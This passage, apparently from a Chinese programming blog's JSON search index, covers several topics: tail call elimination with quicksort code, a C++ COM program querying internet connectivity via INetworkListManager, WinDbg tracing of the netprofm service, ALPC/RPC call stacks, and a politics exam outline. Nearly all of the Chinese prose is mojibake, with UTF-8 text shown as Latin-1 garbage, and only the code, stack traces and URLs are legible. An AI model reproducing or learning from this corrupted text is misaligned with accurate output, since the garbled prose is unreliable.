ˆæ·±åº¦çš„æƒ…å†µä¸‹ï¼Œå°†å°¾è°ƒç”¨è½¬åŒ–ä¸ºä¸€ç§ç±»ä¼¼äºè·³è½¬ï¼ˆgotoï¼‰çš„æ“ä½œï¼Œä»è€Œé¿å…åœ¨è°ƒç”¨æ ˆä¸Šåˆ›å»ºæ–°çš„æ ˆå¸§ã€‚ X64ç¼–è¯‘å™¨å¯ä»¥é€šè¿‡å°†å‡½æ•°çš„æœ€åä¸€æ¬¡è°ƒç”¨æ›¿æ¢ä¸ºè·³è½¬åˆ°è¢«è°ƒç”¨æ–¹æ¥ä¼˜åŒ–è¯¥è°ƒç”¨ã€‚è¿™é¿å…äº†ä¸ºè¢«è°ƒç”¨æ–¹è®¾ç½®å †æ ˆå¸§çš„å¼€é”€ã€‚è°ƒç”¨æ–¹å’Œè¢«è°ƒç”¨æ–¹å…±äº«ç›¸åŒçš„å †æ ˆå¸§ï¼Œè¢«è°ƒç”¨æ–¹ç›´æ¥è¿”å›ç»™è°ƒç”¨æ–¹çš„è°ƒç”¨æ–¹ã€‚å½“è°ƒç”¨æ–¹å’Œè¢«è°ƒç”¨æ–¹å…·æœ‰ç›¸åŒçš„å‚æ•°æ—¶ï¼Œè¿™å°¤å…¶æœ‰ç›Šï¼Œå› ä¸ºå¦‚æœç›¸å…³å‚æ•°å·²ç»åœ¨æ‰€éœ€çš„å¯„å­˜å™¨ä¸­ï¼Œå¹¶ä¸”è¿™äº›å¯„å­˜å™¨æ²¡æœ‰æ›´æ”¹ï¼Œåˆ™ä¸å¿…é‡æ–°åŠ è½½å®ƒä»¬ã€‚ å›¾ 1 æ˜¾ç¤ºäº†åœ¨è°ƒç”¨ Function4æ—¶ Function1ä¸­çš„å°¾éƒ¨è°ƒç”¨æ¶ˆé™¤ã€‚Function1è·³è½¬åˆ° Function4ï¼Œå½“ Function4å®Œæˆæ‰§è¡Œæ—¶ï¼Œå®ƒç›´æ¥è¿”å›åˆ° Function1çš„è°ƒç”¨æ–¹ã€‚ è°ƒç”¨è¿‡ç¨‹å¤§è‡´å¦‚ä¸‹æ‰€ç¤ºï¼š 2. åŸç† ç®€å•è¯´å°±æ˜¯å‡å°‘åˆ›å»ºå †æ ˆçš„è¿‡ç¨‹ åœ¨ä¼ ç»Ÿçš„å‡½æ•°è°ƒç”¨ä¸­ï¼Œæ¯å½“ä¸€ä¸ªå‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œéƒ½ä¼šåœ¨è°ƒç”¨æ ˆä¸Šåˆ›å»ºä¸€ä¸ªæ–°çš„æ ˆå¸§æ¥ä¿å­˜å‡½æ•°çš„å±€éƒ¨å˜é‡ã€å‚æ•°ä»¥åŠè¿”å›åœ°å€ç­‰ä¿¡æ¯ã€‚è€Œåœ¨å°¾è°ƒç”¨çš„æƒ…å†µä¸‹ï¼Œç”±äºè¢«è°ƒç”¨çš„å‡½æ•°æ˜¯è°ƒç”¨å‡½æ•°çš„æœ€åä¸€æ¡æŒ‡ä»¤ï¼Œä¸”è°ƒç”¨å‡½æ•°åœ¨è¢«è°ƒç”¨å‡½æ•°è¿”å›åæ²¡æœ‰å…¶ä»–æ“ä½œéœ€è¦æ‰§è¡Œï¼Œå› æ­¤ç†è®ºä¸Šå¯ä»¥ä¸éœ€è¦ä¿å­˜è°ƒç”¨å‡½æ•°çš„æ ˆå¸§ä¿¡æ¯ã€‚ ç¼–è¯‘å™¨åœ¨æ£€æµ‹åˆ°å°¾è°ƒç”¨æ—¶ï¼Œä¼šä¼˜åŒ–è¿™ä¸ªè°ƒç”¨è¿‡ç¨‹ï¼Œä½¿å…¶ä¸å†åœ¨è°ƒç”¨æ ˆä¸Šåˆ›å»ºæ–°çš„æ ˆå¸§ï¼Œè€Œæ˜¯ç›´æ¥å¤ç”¨å½“å‰æ ˆå¸§ï¼Œå°†å‚æ•°å’Œè¿”å›åœ°å€ç­‰ä¿¡æ¯æ›´æ–°ä¸ºè¢«è°ƒç”¨å‡½æ•°æ‰€éœ€çš„ä¿¡æ¯ï¼Œå¹¶è·³è½¬åˆ°è¢«è°ƒç”¨å‡½æ•°çš„æ‰§è¡Œå…¥å£ã€‚è¿™æ ·ï¼Œå½“è¢«è°ƒç”¨å‡½æ•°è¿”å›æ—¶ï¼Œå°±å¯ä»¥ç›´æ¥è¿”å›åˆ°è°ƒç”¨å‡½æ•°çš„è°ƒç”¨è€…å¤„ï¼Œè€Œä¸éœ€è¦å†ç»è¿‡è°ƒç”¨å‡½æ•°çš„æ ˆå¸§ã€‚ 3. è¯´æ˜ è¿™é‡Œä»¥å¿«é€Ÿæ’åºä¸ºä¾‹ å‚è€ƒæ–‡ç« ï¼šTail Call Elimination - GeeksforGeeks å¸¸è§„çš„å†™æ³•å¦‚ä¸‹æ‰€ç¤ºï¼Œé€šè¿‡é€’å½’è°ƒç”¨æœ€ç»ˆè¾¾åˆ°å¯¹æ•´ä¸ªæ•°æ®æ’åºçš„ç›®çš„ã€‚ 123456789101112131415161718/* Tail recursive function for QuickSort arr[] --&gt; Array to be sorted, low --&gt; Starting index, high --&gt; Ending index */void quickSort(int arr[], int low, int high) &#123; if (low &lt; high) &#123; /* pi is partitioning index, arr[p] is now at right place */ int pi = partition(arr, low, high); // Separately sort elements before // partition and after partition quickSort(arr, low, pi - 1); quickSort(arr, pi + 1, high); &#125; &#125; è¿™é‡Œå°±å¯ä»¥è€ƒè™‘ä½¿ç”¨ Tail Call Elimination æ¥è¿›è¡Œæ›¿æ¢ä¼˜åŒ– 1234567891011121314151617181920212223242526/* QuickSort after tail call elimination arr[] --&gt; Array to be sorted, low --&gt; Starting index, high --&gt; Ending index */void quickSort(int arr[], int low, int high) &#123; start: if (low &lt; high) &#123; /* pi is partitioning index, arr[p] is now at right place */ int pi = partition(arr, low, high); // Separately sort elements before // partition and after partition quickSort(arr, low, pi - 1); // Update parameters of recursive call // and replace recursive call with goto low = pi+1; high = high; goto start; &#125; &#125; // See below link for complete running code // https://ide.geeksforgeeks.org/dbq4yl è¿™ä¹ˆåšçš„ç›®çš„æ˜¯ä¸ºäº†è®©ç¼–è¯‘å™¨å¯ä»¥è¯†åˆ«åˆ°å°¾è°ƒç”¨æ¶ˆé™¤ã€‚æ·»åŠ  start æ ‡ç­¾ï¼Œå¹¶ä¸”åœ¨å°¾éƒ¨æ·»åŠ  goto å³å¯ã€‚ 4. å°¾éƒ¨è°ƒç”¨æ¶ˆé™¤çš„å †æ ˆç®¡ç† é€’å½’ä½¿ç”¨å †æ ˆæ¥è·Ÿè¸ªå‡½æ•°è°ƒç”¨ã€‚æ¯æ¬¡å‡½æ•°è°ƒç”¨æ—¶ï¼Œä¸€ä¸ªæ–°çš„å¸§è¢«æ¨é€åˆ°åŒ…å«æœ¬åœ°å˜é‡å’Œè°ƒç”¨æ•°æ®çš„å †æ ˆä¸Šã€‚å‡è®¾ä¸€ä¸ªå †æ ˆå¸§éœ€è¦ O (1) ï¼Œå³å¸¸é‡å†…å­˜ç©ºé—´ï¼Œé‚£ä¹ˆå¯¹äº N ä¸ªé€’å½’è°ƒç”¨å†…å­˜éœ€è¦ O (N)ã€‚ å°¾è°ƒç”¨æ¶ˆé™¤é™ä½äº†ä» O (N)åˆ° O (1)çš„é€’å½’çš„ç©ºé—´å¤æ‚åº¦ã€‚å½“å‡½æ•°è°ƒç”¨è¢«æ¶ˆé™¤æ—¶ï¼Œä¸ä¼šåˆ›å»ºæ–°çš„å †æ ˆå¸§ï¼Œå‡½æ•°å°†åœ¨å¸¸é‡å†…å­˜ç©ºé—´ä¸­æ‰§è¡Œã€‚ å‡½æ•°å¯ä»¥åœ¨å¸¸é‡å†…å­˜ç©ºé—´ä¸­æ‰§è¡Œï¼Œå› ä¸ºåœ¨å°¾é€’å½’å‡½æ•°ä¸­ï¼Œåœ¨è°ƒç”¨è¯­å¥ä¹‹åæ²¡æœ‰è¯­å¥ï¼Œæ‰€ä»¥ä¸éœ€è¦ä¿ç•™çˆ¶å‡½æ•°çš„çŠ¶æ€å’Œæ¡†æ¶ã€‚å­å‡½æ•°è¢«è°ƒç”¨å¹¶ç«‹å³å®Œæˆï¼Œå®ƒä¸å¿…å°†æ§åˆ¶è¿”å›ç»™çˆ¶å‡½æ•°ã€‚ ç”±äºä¸ä¼šå¯¹è¿”å›çš„å€¼æ‰§è¡Œä»»ä½•è®¡ç®—ï¼Œä¹Ÿä¸ä¼šç•™ä¸‹ä»»ä½•è¯­å¥ä¾›æ‰§è¡Œï¼Œå› æ­¤å¯ä»¥æ ¹æ®å½“å‰å‡½æ•°è°ƒç”¨çš„è¦æ±‚ä¿®æ”¹å½“å‰æ¡†æ¶ã€‚å› æ­¤ï¼Œä¸éœ€è¦ä¿ç•™ä»¥å‰å‡½æ•°è°ƒç”¨çš„å †æ ˆå¸§ï¼Œå‡½æ•°åœ¨å¸¸é‡å†…å­˜ç©ºé—´ä¸­æ‰§è¡Œã€‚è¿™ä½¿å¾—å°¾éƒ¨é€’å½’æ›´å¿«ï¼Œå†…å­˜å‹å¥½ã€‚","tags":[{"name":"æ±‡ç¼–","slug":"æ±‡ç¼–","permalink":"https://hodlyounger.github.io/tags/%E6%B1%87%E7%BC%96/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"æ±‡ç¼–","slug":"B-Code/æ±‡ç¼–","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘è·å–ç½‘ç»œè¿æ¥çŠ¶æ€","date":"2024-08-31T01:35:29.153Z","path":"A_OS/Windows/ç½‘ç»œhelper/ã€ç½‘ç»œç¼–ç¨‹ã€‘è·å–ç½‘ç»œè¿æ¥çŠ¶æ€/","text":"æ¦‚è¿°ï¼šè·å–ç½‘ç»œè¿æ¥çŠ¶æ€è°ƒç”¨æ¥å£åˆ†æ ç¯å¢ƒçŠ¶å†µæè¿°ï¼šwindows 10 x 64 ä½¿ç”¨ COM å¯¹è±¡æŸ¥çœ‹ç½‘ç»œè¿æ¥çŠ¶æ€ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081// INetworkListManager.cpp : This file contains the &#x27;main&#x27; function. Program execution begins and ends there.//#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;netlistmgr.h&gt;#pragma comment(lib, &quot;ole32.lib&quot;)static INetworkListManager* getNetworkList(IUnknown** ppUnknown)&#123; const GUID CLSID_NetworkListManagerXp = &#123; 0xdcb00c01, 0x570f, 0x4a9b, &#123; 0x8d, 0x69, 0x19, 0x9f, 0xdb, 0xa5, 0x72, 0x3b &#125; &#125;; const IID IID_INetworkListManagerXp = &#123; 0xdcb00000, 0x570f, 0x4a9b, &#123; 0x8d, 0x69, 0x19, 0x9f, 0xdb, 0xa5, 0x72, 0x3b &#125; &#125;; BOOL bOnline = TRUE; HRESULT hresult = CoCreateInstance(CLSID_NetworkListManagerXp, NULL, CLSCTX_ALL, IID_IUnknown, (void**)ppUnknown); if (!(SUCCEEDED(hresult))) return nullptr; INetworkListManager* pNetworkListManager = NULL; if (*ppUnknown) hresult = (*ppUnknown)-&gt;QueryInterface(IID_INetworkListManagerXp, (void**)&amp;pNetworkListManager); if (SUCCEEDED(hresult)) return pNetworkListManager; return nullptr;&#125;static BOOL checkIsNetwork(INetworkListManager* pNetworkListManager)&#123; static DWORD s_lastCheck = 0; DWORD lastCheck = ::GetTickCount(); if (lastCheck - s_lastCheck &lt; 15000) return -1; s_lastCheck = lastCheck; if (!pNetworkListManager) return -1; HRESULT hresult = E_FAIL; BOOL isOnline = FALSE; VARIANT_BOOL isConnect = VARIANT_FALSE; if (pNetworkListManager) hresult = pNetworkListManager-&gt;get_IsConnectedToInternet(&amp;isConnect); if (SUCCEEDED(hresult)) isOnline = (isConnect == VARIANT_TRUE) ? TRUE : FALSE; return isOnline;&#125;int main()&#123; CoInitialize(NULL); // system(&quot;pause&quot;);#if 1 VARIANT_BOOL bIsConnected; INetworkListManager *pNetworkListManager = NULL; HRESULT hr = CoCreateInstance(CLSID_NetworkListManager, NULL, CLSCTX_ALL, IID_INetworkListManager, (LPVOID *)&amp;pNetworkListManager); hr = pNetworkListManager-&gt;get_IsConnectedToInternet(&amp;bIsConnected); std::cout &lt;&lt; &quot;IsConnected:&quot; &lt;&lt; bIsConnected &lt;&lt; std::endl;#endif#if 0 IUnknown* pUnknown = nullptr; static INetworkListManager* pNetworkListManager1 = nullptr; if (!pNetworkListManager1) pNetworkListManager1 = getNetworkList(&amp;pUnknown); BOOL checkNetwork = checkIsNetwork(pNetworkListManager1); std::cout &lt;&lt; &quot;IsConnected:&quot; &lt;&lt; checkNetwork &lt;&lt; std::endl;#endif system(&quot;pause&quot;);&#125; è°ƒç”¨åˆ†æ ç»“è®ºï¼šè°ƒç”¨çš„æ¥å£ä¸º get_IsConnectedToInternetï¼Œæ­¤æ¥å£ä¸º RPC å®¢æˆ·ç«¯æ¥å£ï¼Œè°ƒç”¨æ—¶é€šè¿‡ RPC è¿œç¨‹è°ƒç”¨æœåŠ¡ç«¯çš„æ¥å£ã€‚ åˆ†æè¿‡ç¨‹ï¼šè°ƒç”¨æ—¶å¯ä»¥çœ‹åˆ°ä¼šè¿›å…¥ netprofm ä¸­çš„ CPubINetworkListManager::get_IsConnectedToInternet æ¥å£ï¼Œåˆåœ¨è¯¥æ¥å£å½“ä¸­åˆ›å»ºäº† COM å¯¹è±¡é€šè¿‡ RPC è¿œç¨‹è°ƒç”¨åˆ°æœåŠ¡ç«¯çš„ RPC æ¥å£ã€‚ è¿™é‡Œå¯ä»¥åœ¨ GetPrivateNetworkListManager ä¸­çœ‹åˆ°åˆ›å»ºçš„ COM å¯¹è±¡çš„ CLSID å’Œ IIDã€‚åœ¨æ³¨å†Œè¡¨æŸ¥è¯¢ç›¸å…³ COM ç»„ä»¶ã€‚æŸ¥è¯¢ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š é€šè¿‡ CLSID æŸ¥è¯¢ com ç»„ä»¶çš„æ–‡ä»¶ æ¥ç€ä½¿ç”¨ OLEView æŸ¥çœ‹å…·ä½“çš„æ¥å£å¯¹è±¡ï¼Œå¯ä»¥çœ‹åˆ°ä¸º INetworkListManager ã€‚ åœ¨ APPID ä¸­æŸ¥çœ‹ netprofm æ³¨å†Œçš„åº”ç”¨ å¯ä»¥çœ‹åˆ° netprofm æ˜¯ä½œä¸ºæœ¬åœ°æœåŠ¡çš„ï¼ŒæœåŠ¡åå°±æ˜¯ netprofmã€‚ åˆ†æ netprofm æœåŠ¡ è¿™é‡Œè¦åšçš„å°±æ˜¯ä½¿ç”¨ windbg è°ƒè¯•ï¼Œç„¶åæŸ¥çœ‹å¯èƒ½ç›¸å…³çš„ dll æˆ–è€…æ¥å£ ç›¸å…³ DLL åˆ†ææ€è·¯ è¿™é‡Œç”±äºæˆ‘ç¬¬ä¸€æ¬¡è°ƒè¯•ä¹Ÿæ²¡æœ‰ä»€ä¹ˆç»éªŒï¼Œåæ¥åˆå¤§ä½¬å¸®åŠ©ï¼Œæ‰€ä»¥æ•´ä¸ªæ€è·¯æˆ‘éƒ½è¡¥å……ä¸€ä¸‹ï¼Œå°½é‡è¯¦ç»†ä¸€ç‚¹ï¼Œè¿™é‡Œè¡¥å……ä¸‹æœåŠ¡ç«¯è°ƒç”¨åˆ†ææ€è·¯ã€‚ ä½¿ç”¨ windbg è°ƒè¯•å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª netprofmsvc çš„ dll æŸ¥çœ‹å…¶æ¥å£éƒ½æœ‰å“ªäº›ï¼Œç„¶ååœ¨å¯èƒ½ä¼šè¢«è°ƒç”¨çš„æ¥å£ä¸Šæ‰“æ–­ç‚¹1x /D /f netprofmsvc!*Get* ä½¿ç”¨å®¢æˆ·ç«¯æŸ¥è¯¢ï¼Œçœ‹æ–­ç‚¹æ˜¯å¦ä¼šè§¦å‘ ç¨å¾®çœ‹ä¸‹ï¼Œå·®ä¸å¤šä¹Ÿèƒ½çŒœåˆ°åŸºæœ¬ä¸Šéƒ½åœ¨ CImplINetworkListManager ç±»æä¾›çš„æ¥å£ä¸­ï¼Œæ‰“æ–­ç‚¹è°ƒè¯• CImplINetworkListManager::IsConnectedToInternetã€‚å‰©ä¸‹çš„å°±æ˜¯å…·ä½“çš„è°ƒè¯•è¿‡ç¨‹äº†ã€‚å…·ä½“å«ä¹‰å¦‚ä¸‹æ‰€ç¤ºï¼Œ CImplINetworkListManager::GetConnectivity å¾€åçš„æ‰§è¡Œé€»è¾‘æ„Ÿå…´è¶£çš„å¯ä»¥è°ƒè¯•çœ‹çœ‹ã€‚ æ‹“å±•é˜…è¯» è¿™é‡Œè¡¥å……ä¸€ä¸ªæŸ¥è¯¢ç½‘å¡ GUID çš„å †æ ˆï¼Œä¸»è¦è®°å½•æ‹“å±•ä»¥ä¸‹è¿™é‡ŒæŸ¥è¯¢çš„é€»è¾‘ã€‚ è°ƒç”¨å †æ ˆå¦‚ä¸‹æ‰€ç¤ºï¼š 1234567[0x0] NSI!NsiGetParameter 0xa4ee6fdee8 0x7ffc5b1b789f [0x1] IPHLPAPI!InternalGetBestInterface+0xcf 0xa4ee6fdef0 0x7ffc5b1b3c24 [0x2] IPHLPAPI!GetBestInterface+0x44 0xa4ee6fdf90 0x7ffc0e4999d4 [0x3] netprofmsvc!GetBestInterfaceGuid+0xa4 0xa4ee6fdff0 0x7ffc0e499636 [0x4] netprofmsvc!NetworkPropertyMaps::InternalGetConnectivity+0x86 0xa4ee6fe0d0 0x7ffc0e49cd92 [0x5] netprofmsvc!CImplINetworkListManager::GetConnectivity+0x132 0xa4ee6fe210 0x7ffc0e49626c [0x6] netprofmsvc!CImplINetworkListManager::IsConnectedToInternet+0x6c 0xa4ee6fe270 0x7ffc5c7fa2d3 ç›¸å…³çŸ¥è¯† ã€é©±åŠ¨ã€‘ç½‘å¡é©±åŠ¨å¯¼è¯» å…ˆè°ƒè¯•è®°å½•ä¸€ä¸‹åˆ†æè¿‡ç¨‹ï¼š æ·»åŠ æ–­ç‚¹ï¼Œåœ¨ netprofmsvc!GetBestInterfaceGuid ä¹‹åæ‰“æ–­ç‚¹ï¼Œè¿™é‡Œä¸»è¦æ˜¯ä¸ºäº†æŸ¥çœ‹å‡½æ•°æ‰§è¡Œç»“æœ1__int64 __fastcall GetBestInterfaceGuid(struct _GUID *_guid) è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¼ å…¥çš„å‚æ•°ä¸º rcxï¼ŒæŒ‡å‘çš„ä½ç½®ä¸º rbp-61hã€‚åœ¨æ–­ç‚¹å¤„æŸ¥çœ‹è¿™ä¸ªå˜é‡å³å¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š1dt ntdll!_GUID rbp-61h è¿™é‡Œæˆ‘ä»¬å°±è·å–åˆ°äº†ä¸€ä¸ªç½‘å¡çš„ GUID ä¸º &#123;a0dce93d-2e39-496c-a9df-0f894c247ef9&#125;ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯åœ¨æ³¨å†Œè¡¨ä¸­è¿›è¡ŒæŸ¥è¯¢å…·ä½“çš„ç½‘ç»œæ¥å£ã€‚ æŸ¥è¯¢ç½‘å¡é¡¹ï¼ˆè¿™ä¸€æ­¥å¯ä»¥å¿½ç•¥ï¼‰ æ³¨å†Œè¡¨ä½ç½®ï¼šè®¡ç®—æœº\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\&#123;4d36e972-e325-11ce-bfc1-08002be10318&#125; è¿™ä¸ªä½ç½®æ˜¯å›ºå®šçš„ï¼Œéœ€è¦åœ¨è¿™ä¸ªæ³¨å†Œè¡¨é¡¹ä¸‹æ ¹æ®ç¬¬ä¸€æ­¥çš„ GUID æŸ¥è¯¢å…·ä½“çš„é”®å€¼é¡¹ã€‚æŸ¥è¯¢ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š æ ¹æ® GUID æŸ¥è¯¢ç½‘ç»œé€‚é…å™¨ æ³¨å†Œè¡¨ä½ç½®ï¼šSYSTEM\\\\CurrentControlSet\\\\Control\\\\Network\\\\&#123;4D36E972-E325-11CE-BFC1-08002BE10318&#125;\\\\&#123;GUID&#125;","tags":[{"name":"ç½‘ç»œç¼–ç¨‹","slug":"ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"RPC","slug":"RPC","permalink":"https://hodlyounger.github.io/tags/RPC/"},{"name":"com","slug":"com","permalink":"https://hodlyounger.github.io/tags/com/"},{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://hodlyounger.github.io/tags/%E9%80%86%E5%90%91/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç½‘ç»œhelper","slug":"A-OS/Windows/ç½‘ç»œhelper","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"ã€RPCã€‘ALPC è°ƒç”¨è¯¦è§£ï¼ˆç¿»è¯‘|TODOï¼‰","date":"2024-08-31T01:35:29.149Z","path":"A_OS/Windows/RPC/ã€RPCã€‘ALPC/","text":"æ¦‚è¿°ï¼šALPC è°ƒç”¨è¿‡ç¨‹ å­¦ä¹ rpcè°ƒç”¨è¿‡ç¨‹çœ‹åˆ°äº†csandker çš„è¿™ç¯‡æ–‡ç« ï¼Œå­¦ä¹ è®°å½•ä¸€ä¸‹å§ï¼Œä¾›å¤§å®¶å‚è€ƒ Offensive Windows IPC Internals 3: ALPC Â· csandker.io è¡¥ä¸€å¼ ä½œè€…ç”»çš„å›¾ï¼Œæ˜¯alpcçš„å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åˆ›å»ºåŠäº¤äº’çš„è¿‡ç¨‹ã€‚ è¡¥å……ä¸€ä¸ª RPC å‡½æ•°è¢«è°ƒç”¨æ—¶çš„å †æ ˆï¼Œå¦‚ä¸‹æ‰€ç¤ºä¸ºè°ƒç”¨ INetListManager::get_IsConnectedToInternet æ—¶ï¼ŒæœåŠ¡ç«¯è°ƒç”¨åˆ° CImplINetworkListManager::IsConnectedToInternet æ—¶ï¼ŒæœåŠ¡ç«¯çš„è°ƒç”¨å †æ ˆã€‚ 1234567891011121314151617181920212223242526[0x0] netprofmsvc!CImplINetworkListManager::IsConnectedToInternet 0xa4edffe048 0x7ffc5c7fa2d3 [0x1] RPCRT4!Invoke+0x73 0xa4edffe050 0x7ffc5c85beeb [0x2] RPCRT4!Ndr64StubWorker+0xb0b 0xa4edffe0a0 0x7ffc5c7919e9 [0x3] RPCRT4!NdrStubCall3+0xc9 0xa4edffe760 0x7ffc5df9c490 [0x4] combase!CStdStubBuffer_Invoke+0x60 0xa4edffe7c0 0x7ffc5c7dd17b [0x5] RPCRT4!CStdStubBuffer_Invoke+0x3b 0xa4edffe800 0x7ffc5df469c3 [0x6] combase!RoGetAgileReference+0x7313 0xa4edffe830 0x7ffc5df4674e [0x7] combase!RoGetAgileReference+0x709e 0xa4edffe890 0x7ffc5df9efb6 [0x8] combase!HSTRING_UserSize+0x116 0xa4edffe9f0 0x7ffc5df270b3 [0x9] combase!DllGetClassObject+0x683 0xa4edffea30 0x7ffc5df98d5d [0xa] combase!CoGetApartmentType+0x1cd 0xa4edffed80 0x7ffc5df0eb26 [0xb] combase!RoGetActivatableClassRegistration+0x87f6 0xa4edffedd0 0x7ffc5dfdc0c8 [0xc] combase!InternalDoATClassCreate+0x9c98 0xa4edfff190 0x7ffc5df10ae9 [0xd] combase!RoGetActivatableClassRegistration+0xa7b9 0xa4edfff4b0 0x7ffc5c7db128 [0xe] RPCRT4!DispatchToStubInCNoAvrf+0x18 0xa4edfff4e0 0x7ffc5c7b8146 [0xf] RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x1a6 0xa4edfff530 0x7ffc5c7b7d76 [0x10] RPCRT4!RPC_INTERFACE::DispatchToStubWithObject+0x186 0xa4edfff610 0x7ffc5c7c4eff [0x11] RPCRT4!LRPC_SCALL::DispatchRequest+0x16f 0xa4edfff6b0 0x7ffc5c7c44b8 [0x12] RPCRT4!LRPC_SCALL::HandleRequest+0x7f8 0xa4edfff780 0x7ffc5c7c3aa1 [0x13] RPCRT4!LRPC_ADDRESS::HandleRequest+0x341 0xa4edfff890 0x7ffc5c7c350e [0x14] RPCRT4!LRPC_ADDRESS::ProcessIO+0x89e 0xa4edfff930 0x7ffc5c7c7b62 [0x15] RPCRT4!LrpcIoComplete+0xc2 0xa4edfffa70 0x7ffc5e710330 [0x16] ntdll!TppAlpcpExecuteCallback+0x260 0xa4edfffb10 0x7ffc5e73d566 [0x17] ntdll!TppWorkerThread+0x456 0xa4edfffb90 0x7ffc5dd17374 [0x18] KERNEL32!BaseThreadInitThunk+0x14 0xa4edfffe90 0x7ffc5e73cc91 [0x19] ntdll!RtlUserThreadStart+0x21 0xa4edfffec0 0x0","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"RPC","slug":"RPC","permalink":"https://hodlyounger.github.io/tags/RPC/"},{"name":"ALPC","slug":"ALPC","permalink":"https://hodlyounger.github.io/tags/ALPC/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"RPC","slug":"A-OS/Windows/RPC","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/RPC/"}]},{"title":"ã€è¿‘ç°ä»£å²çº²è¦ã€‘02.æ¯›æ³½ä¸œæ€æƒ³å’Œä¸­å›½ç‰¹è‰²ç¤¾ä¼šä¸»ä¹‰ç†è®ºä½“ç³»","date":"2024-08-25T13:52:20.129Z","path":"A_Aç ”/æ”¿æ²»/è¿‘ç°ä»£å²çº²è¦/02.æ¯›æ³½ä¸œæ€æƒ³å’Œä¸­å›½ç‰¹è‰²ç¤¾ä¼šä¸»ä¹‰ç†è®ºä½“ç³»/","text":"Sub title &gt; é˜…è¯»è¿™ç¯‡æ–‡ç« ä½ å¯ä»¥äº†è§£ï¼š æ¯›æ³½ä¸œæ€æƒ³å’Œä¸­å›½ç‰¹è‰²ç¤¾ä¼šä¸»ä¹‰ç†è®ºä½“ç³» å¯¼è®º é©¬å…‹æ€ä¸»ä¹‰ä¸­å›½åŒ–æ—¶ä»£åŒ– æå‡º å…šçš„å…­å±Šå…­ä¸­å…¨ä¼š å¿…è¦æ€§ ç†è®ºæœ¬èº«å‘å±•çš„å†…åœ¨è¦æ±‚ è§£å†³ä¸­å›½å®é™…é—®é¢˜çš„å®¢è§‚éœ€è¦ å†…æ¶µ è¿ç”¨ç†è®ºè§£å†³ä¸­å›½å®é™…é—®é¢˜ æ€»ç»“å’Œæç‚¼å®è·µç»éªŒä¸Šå‡ä¸ºç†è®º æ¤æ ¹äºä¸­åä¼˜ç§€ä¼ ç»Ÿæ–‡åŒ–çš„åœŸå£¤ å†å²è¿‡ç¨‹ æ¯›æ³½ä¸œæ€æƒ³æ˜¯é©¬å…‹æ€ä¸»ä¹‰ä¸­å›½åŒ–æ—¶ä»£åŒ–ç¬¬ä¸€æ¬¡å†å²æ€§é£è·ƒ ä¸­å›½ç‰¹è‰²ç¤¾ä¼šä¸»ä¹‰ç†è®ºä½“ç³»æ˜¯é©¬å…‹æ€ä¸»ä¹‰ä¸­å›½åŒ–æ—¶ä»£åŒ–çš„ç¬¬äºŒæ¬¡é£è·ƒ ä¹ è¿‘å¹³æ–°æ—¶ä»£ä¸­å›½ç‰¹è‰²ç¤¾ä¼šä¸»ä¹‰æ€æƒ³æ˜¯é©¬å…‹æ€ä¸»ä¹‰ä¸­å›½åŒ–æ—¶ä»£åŒ–æ–°çš„é£è·ƒ æ¯›æ³½ä¸œæ€æƒ³ æ¯›æ³½ä¸œæ€æƒ³åŠå…¶å†å²åœ°ä½ æ–°æ°‘ä¸»ä¸»ä¹‰é©å‘½ç†è®º æ–°æ°‘ä¸»ä¸»ä¹‰é©å‘½ç†è®ºå½¢æˆçš„ä¾æ® å›½æƒ…ã€ä¸»è¦çŸ›ç›¾ã€æ ¹æœ¬ä»»åŠ¡ æ€»è·¯çº¿å’ŒåŸºæœ¬çº²é¢† æ€»è·¯çº¿ é©å‘½å¯¹è±¡ é©å‘½åŠ¨åŠ› é¢†å¯¼åŠ›é‡ æ€§è´¨å‰é€” åŸºæœ¬çº²é¢† ç¤¾ä¼šä¸»ä¹‰æ”¹é€ ç†è®º ç¤¾ä¼šä¸»ä¹‰å»ºè®¾é“è·¯åˆæ­¥æ¢ç´¢çš„ç†è®ºæˆæœ","tags":[{"name":"è€ƒç ”","slug":"è€ƒç ”","permalink":"https://hodlyounger.github.io/tags/%E8%80%83%E7%A0%94/"},{"name":"è€ƒç ”/æ”¿æ²»","slug":"è€ƒç ”-æ”¿æ²»","permalink":"https://hodlyounger.github.io/tags/%E8%80%83%E7%A0%94-%E6%94%BF%E6%B2%BB/"}],"categories":[{"name":"A_Aç ”","slug":"A-Aç ”","permalink":"https://hodlyounger.github.io/categories/A-A%E7%A0%94/"},{"name":"æ”¿æ²»","slug":"A-Aç ”/æ”¿æ²»","permalink":"https://hodlyounger.github.io/categories/A-A%E7%A0%94/%E6%94%BF%E6%B2%BB/"},{"name":"è¿‘ç°ä»£å²çº²è¦","slug":"A-Aç 